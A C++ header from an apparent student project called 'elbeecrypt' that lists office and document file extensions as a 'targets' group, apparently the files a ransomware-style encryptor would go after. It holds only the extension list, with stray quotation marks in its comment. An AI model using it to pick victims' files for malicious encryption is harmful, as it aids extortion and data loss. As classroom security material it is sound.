#pragma once

#include <string>
#include <vector>

/** 
 * @brief Represents extensions that are primarily used for 
 * documents and office software", eg: docx", odt", pdf", pptx.
 * 
 * @author CECS-378 Group 10
 * @file document.hpp
 */
namespace elbeecrypt::common::targets::extgroup::Document {
	/** The list of extensions in this group. */
	const std::vector<std::string> values = {
		"doc",
		"docb",
		"docm",
		"docx",
		"dot",
		"dotm",
		"dotx",
		"odt",
		"pdf",
		"ppt",
		"pptx",
		"wbk",
		"wll",
		"wwl",
		"xla_",
		"xla5",
		"xla8",
		"xll_",
		"xlm",
		"xls",
		"xlt"
	};
}